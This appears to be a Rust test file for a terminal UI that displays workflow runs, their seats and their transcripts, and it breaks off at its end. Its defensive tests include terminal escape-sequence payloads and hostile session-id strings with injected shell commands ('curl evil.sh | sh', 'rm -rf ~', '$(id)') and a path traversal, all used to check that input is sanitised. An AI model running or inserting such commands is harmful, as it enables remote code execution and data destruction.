//! The TUI's proofs, all headless: the pure state machine needs no
//! terminal, the draw path runs through `TestBackend` into a buffer, and
//! the shell runs over injected key and refresh sources.

use super::*;
use forge_core::fold::{Cursor, RunState, Status};
use forge_core::{EventEnvelope, EventType};
use forge_store::Store;
use ratatui::backend::TestBackend;
use ratatui::crossterm::event::{MouseEvent, MouseEventKind};
use serde_json::{json, Value};
use std::collections::BTreeMap;
use std::path::Path;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Mutex;

const T0: &str = "2026-01-01T00:00:00Z";
const T1: &str = "2026-01-01T00:00:05Z";
const T2: &str = "2026-01-01T00:02:03Z";
const NOW: &str = "2026-01-01T00:07:03Z";

// -------------------------------------------------------------- fixtures

fn ev(seq: u64, event_type: EventType, payload: Value, at: &str) -> EventEnvelope {
    EventEnvelope {
        run_id: "run-7".to_string(),
        seq,
        event_id: format!("ev{seq}"),
        event_schema_version: 1,
        event_type,
        payload,
        causation_id: None,
        correlation_id: "corr".to_string(),
        attempt_id: None,
        recorded_at: at.to_string(),
        previous_hash: String::new(),
        event_hash: String::new(),
    }
}

fn state() -> RunState {
    state_of(Status::Running)
}

fn state_of(status: Status) -> RunState {
    RunState {
        run_id: "run-7".to_string(),
        seq: 18,
        last_hash: "hash".to_string(),
        status,
        phase: Some("design".to_string()),
        cursor: Cursor::Idle,
        consecutive_failures: BTreeMap::new(),
        last_decision: Some(json!({"rule_id": "INTAKE-OK", "from": "intake",
                                   "next": "design", "result": "intook"})),
        reviewed_heads: None,
        park_reason: None,
        feature: Some("one derivation, three surfaces".to_string()),
        pending_command: None,
    }
}

/// An intake seat that concluded, then a design sequence: a forked step
/// with two members, a one-member step, and a bare member still working.
/// Every shape the graph draws, in one run.
fn journal(seat: &str) -> Vec<EventEnvelope> {
    let mut events = vec![
        ev(
            1,
            EventType::RunStarted,
            json!({"feature": "one derivation, three surfaces"}),
            T0,
        ),
        ev(2, EventType::PhaseEntered, json!({"phase": "intake"}), T0),
        ev(
            3,
            EventType::EffectRequested,
            json!({"effect_id": "eff-i", "seat": seat, "phase": "intake"}),
            T0,
        ),
        ev(
            4,
            EventType::EffectStarted,
            json!({"effect_id": "eff-i", "attempt_id": "att1"}),
            T0,
        ),
        ev(
            5,
            EventType::EffectCheckpointed,
            json!({"effect_id": "eff-i", "attempt_id": "att1",
                   "checkpoint": {"step": "seat-turn", "turn": 3, "tool": "Read",
                                  "target": "docs/decisions/0014-interactive-tui.md"}}),
            T0,
        ),
        ev(
            6,
            EventType::EffectCheckpointed,
            json!({"effect_id": "eff-i", "attempt_id": "att1",
                   "checkpoint": {"step": "claude-session-finished",
                                  "session_id": "abcd-1234", "total_cost_usd": 0.03125}}),
            T1,
        ),
        ev(
            7,
            EventType::EffectSucceeded,
            json!({"effect_id": "eff-i", "attempt_id": "att1",
                   "result": {"result": "intook"}}),
            T2,
        ),
        ev(
            8,
            EventType::TransitionDecided,
            json!({"rule_id": "INTAKE-OK", "severity": "normal", "from": "intake",
                   "next": "design", "result": "intook"}),
            T2,
        ),
        ev(9, EventType::PhaseEntered, json!({"phase": "design"}), T2),
        ev(
            10,
            EventType::EffectRequested,
            json!({"effect_id": "eff-d", "seat": "design", "phase": "design"}),
            T2,
        ),
        ev(
            11,
            EventType::EffectStarted,
            json!({"effect_id": "eff-d", "attempt_id": "att2"}),
            T2,
        ),
    ];
    for (seq, member) in [(12, "positions:simplicity"), (13, "positions:robustness")] {
        events.push(ev(
            seq,
            EventType::EffectCheckpointed,
            json!({"effect_id": "eff-d", "attempt_id": "att2",
                   "checkpoint": {"member": member, "step": "panel-member-finished",
                                  "outcome": "succeeded"}}),
            T2,
        ));
    }
    events.push(ev(
        14,
        EventType::EffectCheckpointed,
        json!({"effect_id": "eff-d", "attempt_id": "att2",
               "checkpoint": {"step": "sequence-step-finished", "step_name": "positions"}}),
        T2,
    ));
    events.push(ev(
        15,
        EventType::EffectCheckpointed,
        json!({"effect_id": "eff-d", "attempt_id": "att2",
               "checkpoint": {"member": "review:only", "step": "panel-member-finished",
                              "outcome": "succeeded"}}),
        T2,
    ));
    events.push(ev(
        16,
        EventType::EffectCheckpointed,
        json!({"effect_id": "eff-d", "attempt_id": "att2",
               "checkpoint": {"step": "sequence-step-finished", "step_name": "review"}}),
        T2,
    ));
    events.push(ev(
        17,
        EventType::EffectCheckpointed,
        json!({"effect_id": "eff-d", "attempt_id": "att2",
               "checkpoint": {"member": "chief", "step": "seat-turn", "turn": 2,
                              "tool": "Write", "target": "specs/interactive-tui/spec.md"}}),
        T2,
    ));
    events
}

fn run_view_for(seat: &str) -> RunView {
    forge_view::run_view(&journal(seat), Some(&state()))
}

/// Two runs plus one whose journal does not fold and whose stamp does
/// not parse: the absence marks have a row to live in.
fn fleet() -> RunsView {
    let folded = state();
    let entries = [
        forge_view::RunEntry {
            run_id: "run-unfoldable",
            feature: "a run whose journal does not fold",
            created_at: "not a timestamp",
            state: None,
        },
        forge_view::RunEntry {
            run_id: "run-old",
            feature: "an older feature",
            created_at: T0,
            state: Some(&folded),
        },
        forge_view::RunEntry {
            run_id: "run-7",
            feature: "one derivation, three surfaces",
            created_at: T1,
            state: Some(&folded),
        },
    ];
    forge_view::run_rows(&entries)
}

fn views_with(seat: &str) -> Views {
    Views {
        now: NOW.to_string(),
        runs: fleet(),
        run: Some(run_view_for(seat)),
        transcript: None,
    }
}

fn views() -> Views {
    views_with("intake")
}

/// The RUN level for `run-7`, as `Enter` on the fleet leaves it.
fn at_run() -> Tui {
    let mut tui = Tui::new(None);
    tui.cursor[0] = Some("run-7".to_string());
    let views = views();
    apply(&mut tui, &views, Key::Enter);
    tui
}

/// The RUN level with the seats pane focused and a seat under the
/// cursor.
fn at_seats(key: &str) -> Tui {
    let mut tui = at_run();
    tui.pane = 1;
    tui.cursor[1] = Some(key.to_string());
    tui
}

fn buffer_of(tui: &Tui, views: &Views, width: u16, height: u16) -> Vec<String> {
    let mut terminal = Terminal::new(TestBackend::new(width, height)).unwrap();
    terminal.draw(|frame| draw(frame, tui, views)).unwrap();
    let buffer = terminal.backend().buffer().clone();
    let mut lines = Vec::new();
    for row in 0..buffer.area.height {
        let mut line = String::new();
        for column in 0..buffer.area.width {
            line.push_str(buffer[(column, row)].symbol());
        }
        lines.push(line);
    }
    lines
}

fn frame_of(tui: &Tui, views: &Views, width: u16, height: u16) -> String {
    buffer_of(tui, views, width, height).join("\n")
}

/// The characters of one buffer line from column `x` — how "the
/// neighbouring column starts at its expected x" is asked.
fn at(line: &str, x: usize) -> String {
    line.chars().skip(x).collect()
}

// -------------------------------------------------- AC-14: key translation

#[test]
fn key_translation_filters_releases_binds_ctrl_c_and_names_what_it_ignores() {
    let pressed = |code| Event::Key(KeyEvent::new(code, KeyModifiers::NONE));
    assert_eq!(from_crossterm(pressed(KeyCode::Up)), Some(Key::Up));
    assert_eq!(from_crossterm(pressed(KeyCode::Down)), Some(Key::Down));
    assert_eq!(from_crossterm(pressed(KeyCode::Left)), Some(Key::Left));
    assert_eq!(from_crossterm(pressed(KeyCode::Right)), Some(Key::Right));
    assert_eq!(from_crossterm(pressed(KeyCode::PageUp)), Some(Key::PageUp));
    assert_eq!(
        from_crossterm(pressed(KeyCode::PageDown)),
        Some(Key::PageDown)
    );
    assert_eq!(from_crossterm(pressed(KeyCode::Tab)), Some(Key::Tab));
    assert_eq!(from_crossterm(pressed(KeyCode::BackTab)), Some(Key::Tab));
    assert_eq!(from_crossterm(pressed(KeyCode::Enter)), Some(Key::Enter));
    assert_eq!(from_crossterm(pressed(KeyCode::Esc)), Some(Key::Escape));
    assert_eq!(
        from_crossterm(pressed(KeyCode::Backspace)),
        Some(Key::Backspace)
    );
    assert_eq!(
        from_crossterm(pressed(KeyCode::Char('j'))),
        Some(Key::Char('j'))
    );
    assert_eq!(from_crossterm(pressed(KeyCode::Home)), None, "unbound");

    // Raw mode disables SIGINT, so an operator whose draw path wedges
    // must still have a way out.
    assert_eq!(
        from_crossterm(Event::Key(KeyEvent::new(
            KeyCode::Char('c'),
            KeyModifiers::CONTROL
        ))),
        Some(Key::Quit)
    );

    // Windows delivers key RELEASES too: a handler matching on KeyCode
    // alone would process every keystroke twice on that CI leg.
    let mut release = KeyEvent::new(KeyCode::Char('q'), KeyModifiers::NONE);
    release.kind = KeyEventKind::Release;
    assert_eq!(from_crossterm(Event::Key(release)), None);

    // Ignored by named arms, never by an untested wildcard.
    assert_eq!(
        from_crossterm(Event::Mouse(MouseEvent {
            kind: MouseEventKind::Moved,
            column: 1,
            row: 1,
            modifiers: KeyModifiers::NONE,
        })),
        None
    );
    assert_eq!(from_crossterm(Event::Paste("pasted".into())), None);
    assert_eq!(from_crossterm(Event::FocusGained), None);
    assert_eq!(from_crossterm(Event::FocusLost), None);
    assert_eq!(from_crossterm(Event::Resize(10, 10)), None);
}

// ------------------------------------------------------ AC-7: movement

#[test]
fn movement_wraps_pages_and_forgets_a_vanished_key() {
    let keys: Vec<String> = ["a", "b", "c"].iter().map(|k| k.to_string()).collect();
    let mut cursor = None;

    move_to(&keys, &mut cursor, Step::Down);
    assert_eq!(
        cursor.as_deref(),
        Some("a"),
        "no selection starts at the top"
    );
    move_to(&keys, &mut cursor, Step::Up);
    assert_eq!(cursor.as_deref(), Some("c"), "wraps at the top end");
    move_to(&keys, &mut cursor, Step::Down);
    assert_eq!(cursor.as_deref(), Some("a"), "wraps at the bottom end");
    move_to(&keys, &mut cursor, Step::Down);
    assert_eq!(cursor.as_deref(), Some("b"));
    move_to(&keys, &mut cursor, Step::Up);
    assert_eq!(cursor.as_deref(), Some("a"));
    move_to(&keys, &mut cursor, Step::Bottom);
    assert_eq!(cursor.as_deref(), Some("c"));
    move_to(&keys, &mut cursor, Step::Top);
    assert_eq!(cursor.as_deref(), Some("a"));
    move_to(&keys, &mut cursor, Step::PageDown);
    assert_eq!(cursor.as_deref(), Some("c"), "paging stops at the end");
    move_to(&keys, &mut cursor, Step::PageUp);
    assert_eq!(cursor.as_deref(), Some("a"), "and at the start");

    // The subject vanished across a refresh, or the filter excluded it:
    // movement restarts from the top, and `G` still reaches the bottom.
    cursor = Some("gone".to_string());
    assert_eq!(index_of(&keys, &cursor), None);
    move_to(&keys, &mut cursor, Step::Down);
    assert_eq!(cursor.as_deref(), Some("a"));
    cursor = Some("gone".to_string());
    move_to(&keys, &mut cursor, Step::Bottom);
    assert_eq!(cursor.as_deref(), Some("c"));

    // An empty list holds no selection at all.
    let mut cursor = Some("a".to_string());
    move_to(&[], &mut cursor, Step::Down);
    assert_eq!(cursor, None);
    assert_eq!(index_of(&keys, &None), None);
}

// ------------------------------------------ AC-4, AC-5: the Enter/Esc ladder

#[test]
fn enter_descends_one_rung_at_a_time_and_esc_pops_the_same_rungs() {
    let views = views();
    let mut tui = Tui::new(None);
    assert_eq!(tui.level, Level::Runs);

    // Rung 1: RUNS, cursor on a run.
    assert_eq!(apply(&mut tui, &views, Key::Enter), Flow::Continue);
    assert_eq!(tui.run, None, "no selection descends into nothing");
    apply(&mut tui, &views, Key::Down);
    assert_eq!(tui.cursor[0].as_deref(), Some("run-7"), "newest first");
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Run);
    assert_eq!(tui.run.as_deref(), Some("run-7"));
    assert_eq!(tui.pane, 0);

    // A pane with no selected row is not a door. This is a normal first
    // frame, before the operator has moved the cursor onto a graph node.
    apply(&mut tui, &views, Key::Enter);
    assert!(tui.scope.is_none(), "no selection descends into nothing");

    // Rung 2: RUN · graph → a phase scope. The graph's rail moves on
    // `j`/`k` (and on `←→`); `↑↓` there walk the lanes inside a phase.
    apply(&mut tui, &views, Key::Char('j'));
    apply(&mut tui, &views, Key::Enter);
    assert!(
        matches!(&tui.scope, Some(render::Scope::Phase(name)) if name == "intake"),
        "the graph pane scopes by phase"
    );

    // Rung 3: RUN · seats, an unscoped seat → a seat scope.
    apply(&mut tui, &views, Key::Escape);
    assert!(tui.scope.is_none(), "Esc rung 4 clears the scope");
    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 1);
    apply(&mut tui, &views, Key::Down);
    let seat = tui.cursor[1].clone().unwrap();
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(scoped_seat(&tui), Some(seat.as_str()));
    assert_eq!(tui.level, Level::Run, "one rung, not two");

    // Rung 4: the SAME seat again → descend.
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);
    assert_eq!(tui.seat.as_deref(), Some(seat.as_str()));

    // Rung 3 of Esc: back to the seat you were reading, scope retained.
    apply(&mut tui, &views, Key::Escape);
    assert_eq!(tui.level, Level::Run);
    assert_eq!(tui.seat, None);
    assert_eq!(tui.pane, 1, "landed back on the seats pane");
    assert_eq!(scoped_seat(&tui), Some(seat.as_str()), "scope retained");

    // Rungs 4 and 5, then rung 6: Esc NEVER quits.
    apply(&mut tui, &views, Key::Escape);
    assert!(tui.scope.is_none());
    apply(&mut tui, &views, Key::Escape);
    assert_eq!(tui.level, Level::Runs);
    assert_eq!(apply(&mut tui, &views, Key::Escape), Flow::Continue);
    assert_eq!(tui.level, Level::Runs, "the bottom rung does nothing");
}

#[test]
fn backspace_ascends_by_rungs_three_and_five_and_never_clears_a_scope() {
    let views = views();
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);

    apply(&mut tui, &views, Key::Backspace);
    assert_eq!(tui.level, Level::Run);
    assert_eq!(
        scoped_seat(&tui),
        Some("eff-i"),
        "ascending never clears a scope"
    );
    apply(&mut tui, &views, Key::Backspace);
    assert_eq!(tui.level, Level::Runs, "rung 5, with the scope untouched");
    apply(&mut tui, &views, Key::Backspace);
    assert_eq!(tui.level, Level::Runs);
}

#[test]
fn the_run_flag_opens_at_the_run_level_and_esc_walks_to_the_fleet() {
    let views = views();
    let mut tui = Tui::new(Some("run-7".to_string()));
    assert_eq!(tui.level, Level::Run, "--run opens at its run");
    apply(&mut tui, &views, Key::Escape);
    assert_eq!(tui.level, Level::Runs, "and Esc reaches the full fleet");
    assert_eq!(tui.run.as_deref(), Some("run-7"));
}

#[test]
fn tab_cycles_the_panes_a_level_has_and_a_new_run_clears_every_selection() {
    let views = views();
    let mut tui = Tui::new(None);
    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 0, "one pane at RUNS: a visible no-op");

    let mut tui = at_run();
    for expected in [1, 2, 0] {
        apply(&mut tui, &views, Key::Tab);
        assert_eq!(tui.pane, expected);
    }

    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);
    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 1);
    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 0, "two panes at PARTICIPANT");

    // Assigning a run clears scope, seat, filter and every cursor.
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    tui.filter = "run".to_string();
    tui.level = Level::Runs;
    tui.pane = 0;
    tui.cursor[0] = Some("run-old".to_string());
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.run.as_deref(), Some("run-old"));
    assert!(tui.scope.is_none() && tui.seat.is_none());
    assert!(tui.filter.is_empty() && !tui.typing);
    assert_eq!(tui.cursor, [None, None, None]);
}

// ------------------------------------------------ AC-6, AC-11: filtering

#[test]
fn a_filter_narrows_the_focused_list_incrementally_and_never_clears_a_scope() {
    let views = views();
    let mut tui = at_run();
    assert_eq!(keys_for(&tui, &views).len(), 2, "two phases");

    apply(&mut tui, &views, Key::Char('/'));
    assert!(tui.typing);
    for (character, expected) in [('d', 1), ('e', 1), ('z', 0)] {
        apply(&mut tui, &views, Key::Char(character));
        assert_eq!(
            keys_for(&tui, &views).len(),
            expected,
            "filter {:?} narrows as it is typed",
            tui.filter
        );
    }
    apply(&mut tui, &views, Key::Backspace);
    assert_eq!(tui.filter, "de", "Backspace deletes one character");
    assert_eq!(keys_for(&tui, &views).len(), 1);
    apply(&mut tui, &views, Key::Enter);
    assert!(!tui.typing, "Enter commits the filter");
    assert_eq!(tui.filter, "de", "and keeps it");
    apply(&mut tui, &views, Key::Escape);
    assert!(tui.filter.is_empty(), "Esc clears the filter");
    assert_eq!(tui.level, Level::Run, "clearing a filter is not ascending");

    // A filter that hides the scoped subject leaves the scope intact:
    // absence from a FILTERED list is a display fact, and only absence
    // from the unfiltered model is the vanish condition.
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    assert!(tui.scope.is_some());
    apply(&mut tui, &views, Key::Char('/'));
    apply(&mut tui, &views, Key::Char('z'));
    settle(&mut tui, &views);
    assert!(keys_for(&tui, &views).is_empty(), "nothing matches");
    assert_eq!(scoped_seat(&tui), Some("eff-i"), "the scope survives");

    // Operator input is sanitized before it is echoed anywhere.
    let mut tui = Tui::new(None);
    apply(&mut tui, &views, Key::Char('/'));
    for character in "a\x1b[2Jb\r".chars() {
        apply(&mut tui, &views, Key::Char(character));
    }
    assert_eq!(tui.filter, "a[2Jb", "a pasted escape sequence is inert");
    assert!(!footer_for(&tui).contains('\x1b'));
}

// ------------------------------------------- AC-6, AC-7: scoping and vanish

#[test]
fn a_second_selection_replaces_the_first_and_a_vanished_subject_clears_itself() {
    let views = views();
    let mut tui = at_run();
    apply(&mut tui, &views, Key::Char('j'));
    apply(&mut tui, &views, Key::Enter);
    assert!(matches!(&tui.scope, Some(render::Scope::Phase(name)) if name == "intake"));
    // The graph pane lists every phase whether or not one is scoped —
    // a selector that hid the alternatives could never replace a scope.
    apply(&mut tui, &views, Key::Char('j'));
    apply(&mut tui, &views, Key::Enter);
    assert!(
        matches!(&tui.scope, Some(render::Scope::Phase(name)) if name == "design"),
        "exclusivity is one Option field, not a rule: {:?}",
        tui.cursor
    );

    // Selection SURVIVES a refresh that changes the list: the same
    // state, applied against a second, longer RunView, still resolves.
    let mut grown = views_with("intake");
    grown.runs = fleet();
    settle(&mut tui, &grown);
    assert!(tui.scope.is_some(), "the phase is still there");
    assert_eq!(selected(&tui, &grown).as_deref(), Some("design"));

    // And CLEARS ITSELF when the subject vanishes from the unfiltered
    // model — here, a run whose journal holds no such phase.
    let empty = Views {
        now: NOW.to_string(),
        runs: fleet(),
        run: Some(forge_view::run_view(&[], None)),
        transcript: None,
    };
    settle(&mut tui, &empty);
    assert!(tui.scope.is_none(), "the phase went away");
    assert_eq!(selected(&tui, &empty), None);

    // A seat that vanishes takes the PARTICIPANT level with it.
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);
    settle(&mut tui, &views);
    assert_eq!(tui.level, Level::Participant, "still there, still open");
    settle(&mut tui, &empty);
    assert_eq!(tui.level, Level::Run);
    assert_eq!(tui.seat, None);

    // A run that vanishes from a NON-EMPTY fleet clears the selection;
    // an empty fleet is the unreadable-journal frame and proves nothing.
    let mut tui = at_run();
    settle(&mut tui, &Views::empty());
    assert_eq!(tui.run.as_deref(), Some("run-7"), "no fleet, no evidence");
    let others = Views {
        now: NOW.to_string(),
        runs: forge_view::run_rows(&[forge_view::RunEntry {
            run_id: "run-other",
            feature: "another run",
            created_at: T0,
            state: None,
        }]),
        run: None,
        transcript: None,
    };
    settle(&mut tui, &others);
    assert_eq!(tui.run, None);
    assert_eq!(tui.level, Level::Runs);
}

// -------------------------------------------------------- AC-8: the footer

#[test]
fn the_footer_names_the_keys_of_the_context_it_is_in() {
    let views = views();
    let mut states: Vec<String> = Vec::new();

    let tui = Tui::new(None);
    states.push(footer_for(&tui));
    assert!(states[0].contains("Enter open run"), "{}", states[0]);

    let mut tui = at_run();
    states.push(footer_for(&tui));
    assert!(states[1].contains("Enter scope phase"));
    // The graph is the one pane whose primary axis is horizontal, and
    // the footer is where an operator finds that out.
    assert!(states[1].contains("←→ rail"), "{}", states[1]);
    assert!(states[1].contains("↑↓ lanes"), "{}", states[1]);

    apply(&mut tui, &views, Key::Tab);
    apply(&mut tui, &views, Key::Down);
    states.push(footer_for(&tui));
    assert!(states[2].contains("Enter scope seat"), "{}", states[2]);

    apply(&mut tui, &views, Key::Enter);
    states.push(footer_for(&tui));
    assert!(
        states[3].contains("Enter open seat"),
        "an already-scoped seat opens: {}",
        states[3]
    );

    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 2, "the trail");
    states.push(footer_for(&tui));
    assert!(states[4].contains("Tab pane"));

    // The footer fails closed if a future pane is introduced before it
    // receives an Enter action: do not advertise opening the trail.
    tui.pane = 3;
    let unknown_footer = footer_for(&tui);
    assert!(
        !unknown_footer.contains("Enter read row"),
        "{unknown_footer}"
    );
    tui.pane = 2;

    apply(&mut tui, &views, Key::Tab);
    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 1, "back on the scoped seat");
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);
    states.push(footer_for(&tui));
    assert!(states[5].contains("scroll"), "{}", states[5]);

    apply(&mut tui, &views, Key::Char('/'));
    states.push(footer_for(&tui));
    assert!(states[6].starts_with('/'));

    apply(&mut tui, &views, Key::Escape);
    apply(&mut tui, &views, Key::Char('?'));
    states.push(footer_for(&tui));
    assert!(states[7].contains("close help"));

    // Every context differs from every other: a footer that always
    // printed the same string could not pass this.
    for (index, state) in states.iter().enumerate() {
        for (other_index, other) in states.iter().enumerate() {
            assert!(
                index == other_index || state != other,
                "contexts {index} and {other_index} share a footer: {state}"
            );
        }
        // While a filter is being typed, `q` is a letter — so that
        // context names what it does have instead.
        assert!(
            state.contains("quit") || state.starts_with('/'),
            "every context names its way out: {state}"
        );
    }
}

#[test]
fn the_status_line_is_the_breadcrumb_or_the_sentence_a_bad_journal_earns() {
    let views = views();
    let tui = Tui::new(None);
    assert_eq!(status_line(&tui), "runs");

    let mut tui = at_seats("eff-i");
    assert!(status_line(&tui).contains("run run-7"));
    apply(&mut tui, &views, Key::Enter);
    assert!(status_line(&tui).contains("scoped eff-i"));
    apply(&mut tui, &views, Key::Enter);
    assert!(status_line(&tui).contains("seat eff-i"));

    let mut tui = at_run();
    apply(&mut tui, &views, Key::Char('j'));
    apply(&mut tui, &views, Key::Enter);
    assert!(status_line(&tui).contains("phase intake"));

    tui.status = Some("the journal is not readable right now: locked".to_string());
    assert!(status_line(&tui).contains("not readable"));
}

// ------------------------------------------ AC-3, AC-10, AC-11: the paint

#[test]
fn the_runs_table_is_a_bordered_navigable_table_of_model_fields() {
    let views = views();
    let mut tui = Tui::new(None);
    apply(&mut tui, &views, Key::Down);
    let frame = frame_of(&tui, &views, 100, 20);

    assert!(frame.contains("┌"), "bordered: {frame}");
    for column in ["id", "status", "phase", "seq", "age", "feature"] {
        assert!(frame.contains(column), "header names {column}: {frame}");
    }
    assert!(frame.contains("run-7"));
    assert!(frame.contains("running"));
    assert!(frame.contains("design"));
    assert!(frame.contains("7m03s"), "age is the model's: {frame}");
    assert!(frame.contains("one derivation"));
    // A run whose journal does not fold KEEPS ITS ROW, with the absence
    // marks the models carry rather than a guessed status.
    assert!(frame.contains("run-unfoldable"), "{frame}");
    assert!(frame.contains('?') && frame.contains('—'), "{frame}");
    // The footer names this context's keys, in the frame itself.
    assert!(frame.contains("Enter open run"), "{frame}");
}

#[test]
fn the_run_level_draws_the_graph_the_seats_and_the_trail() {
    let views = views();
    let tui = at_run();
    let frame = frame_of(&tui, &views, 110, 30);

    // The console's grammar: one rail, arrowed steps, a fork that
    // rejoins, and the phase names on one shared baseline.
    assert!(frame.contains("──>"), "an arrowed edge: {frame}");
    assert!(
        frame.contains('┤') && frame.contains('├'),
        "a fork: {frame}"
    );
    assert!(frame.contains('┌') && frame.contains('┘'), "lanes: {frame}");
    assert!(frame.contains("simplicity"), "a member label: {frame}");
    assert!(frame.contains("positions"), "the step's own name: {frame}");
    assert!(
        frame.contains("intake") && frame.contains("design"),
        "{frame}"
    );
    // `×N` is the console's rule: nothing at all for a single visit.
    assert!(!frame.contains('×'), "no ×1 on a first visit: {frame}");

    // The seats table: six columns of model fields.
    for column in [
        "participant",
        "status",
        "attempts",
        "turns",
        "cost",
        "activity",
    ] {
        assert!(frame.contains(column), "header names {column}: {frame}");
    }
    assert!(frame.contains("succeeded"), "a concluded seat: {frame}");
    assert!(frame.contains("intook"), "activity.text: {frame}");
    assert!(frame.contains("$0.03"), "the cost cell: {frame}");
    // A working seat shows its live tool and target — the model's own
    // composition of `activity.tool` and `activity.target_short`.
    assert!(
        frame.contains("Write · …/interactive-tui/spec.md") || frame.contains("Write · "),
        "{frame}"
    );

    // The decision trail.
    assert!(frame.contains("INTAKE-OK"), "{frame}");
    assert!(frame.contains("transition/decided"), "{frame}");
}

#[test]
fn a_hostile_seat_label_renders_inert_and_does_not_move_its_neighbour() {
    // A seat label carrying an OSC title-set, a carriage return and a
    // RIGHT-TO-LEFT OVERRIDE: three ways to forge a ruling line.
    let views = views_with("seat\x1b]0;pwn\x07\rdeppots\u{202E}");
    let mut tui = at_run();
    tui.pane = 1;
    let lines = buffer_of(&tui, &views, 110, 30);
    let frame = lines.join("\n");

    assert!(!frame.contains('\x1b'), "no escape reaches the buffer");
    assert!(!frame.contains('\r'), "no carriage return either");
    assert!(!frame.contains('\u{202E}'), "and no reordering override");
    assert!(
        frame.contains("seat]0;pwndeppots"),
        "in source order: {frame}"
    );

    // The width half of the claim: the neighbouring column still starts
    // where the header says it does.
    let head = lines
        .iter()
        .position(|line| line.contains("participant"))
        .expect("the seats header is drawn");
    // Columns are counted in characters, not bytes: the border glyphs
    // are three bytes each and the claim is about where a column
    // *appears*.
    let byte = lines[head].find("status").expect("a status column");
    let x = lines[head][..byte].chars().count();
    let row = lines[head..]
        .iter()
        .find(|line| line.contains("seat]0;pwn"))
        .expect("the hostile row is drawn");
    assert!(
        at(row, x).starts_with("succeeded"),
        "the status column starts at x={x}: {row:?}"
    );
}

#[test]
fn the_participant_level_shows_the_stream_the_resume_line_and_the_transcript() {
    let mut views = views();
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);

    // No local transcript: the pane says so, and the resume line is
    // still there — it is the escape hatch that always exists.
    let frame = frame_of(&tui, &views, 100, 26);
    assert!(frame.contains("claude --resume abcd-1234"), "{frame}");
    assert!(frame.contains("no local session transcript"), "{frame}");
    assert!(frame.contains("effect/succeeded"), "terminal_line: {frame}");
    assert!(frame.contains("Read"), "the checkpoint stream: {frame}");

    // With one: prose and tool markers, and the truncation flag SHOWN.
    views.transcript = Some((
        vec![crate::ui::Turn {
            role: "assistant".to_string(),
            ts: T1.to_string(),
            blocks: vec![crate::ui::Block {
                kind: "text",
                text: "the seat's own words".to_string(),
            }],
        }],
        true,
    ));
    let frame = frame_of(&tui, &views, 100, 26);
    assert!(frame.contains("the seat's own words"), "{frame}");
    assert!(frame.contains("transcript truncated"), "{frame}");

    // A seat with no session id still gets the line, carrying the
    // model's absence mark rather than a pasteable lie.
    let views = views_with("intake");
    let mut tui = at_seats("eff-d");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    let frame = frame_of(&tui, &views, 100, 26);
    assert!(frame.contains("claude --resume —"), "{frame}");
}

#[test]
fn a_shell_bearing_session_id_never_becomes_a_pasteable_command() {
    // session_id is a raw journal string rendered into a command the
    // operator is invited to paste. Control characters are stripped,
    // but ';', '&&', '$(…)' and backticks are not — so an id that
    // cannot name a transcript is shown as an absence, never as a
    // suggestion. Same guard the session lookup already applies.
    for hostile in [
        "abc; curl evil.sh | sh",
        "abc && rm -rf ~",
        "$(id)",
        "`id`",
        "../../etc/passwd",
    ] {
        assert!(
            !crate::ui::valid_session_id(hostile),
            "{hostile:?} must not pass the guard"
        );
        let mut views = views();
        for part in &mut views.run.as_mut().unwrap().participants {
            part.session_id = Some(hostile.to_string());
        }
        let mut tui = at_seats("eff-d");
        apply(&mut tui, &views, Key::Enter);
        apply(&mut tui, &views, Key::Enter);
        let frame = frame_of(&tui, &views, 100, 26);
        assert!(
            frame.contains("claude --resume —"),
            "hostile id reached the resume line: {frame}"
        );
        assert!(!frame.contains("curl"), "{frame}");
        assert!(!frame.contains("rm -rf"), "{frame}");
    }
}

#[test]
fn scrolling_a_paragraph_pane_moves_its_offset_within_the_stream() {
    let mut views = views();
    views.transcript = Some((
        (0..4)
            .map(|index| crate::ui::Turn {
                role: format!("turn {index}"),
                ts: T1.to_string(),
                blocks: Vec::new(),
            })
            .collect(),
        false,
    ));
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);

    apply(&mut tui, &views, Key::Down);
    assert_eq!(tui.offset, 1, "the checkpoint pane scrolls");
    apply(&mut tui, &views, Key::Char('G'));
    assert_eq!(
        tui.offset,
        seat_of(&tui, &views).unwrap().checkpoints.len() - 1
    );
    apply(&mut tui, &views, Key::Char('g'));
    assert_eq!(tui.offset, 0);
    apply(&mut tui, &views, Key::PageDown);
    apply(&mut tui, &views, Key::PageUp);
    assert_eq!(tui.offset, 0);

    apply(&mut tui, &views, Key::Tab);
    apply(&mut tui, &views, Key::Char('G'));
    assert_eq!(tui.offset, 3, "and so does the transcript pane");
    assert_eq!(offset_for(&tui, 1), 3);
    assert_eq!(offset_for(&tui, 0), 0, "an unfocused pane keeps its top");

    // A pane with nothing in it holds no offset at all.
    views.transcript = None;
    apply(&mut tui, &views, Key::Char('G'));
    assert_eq!(tui.offset, 0);
}

// ---------------------------------------------- AC-8, AC-13: help and size

#[test]
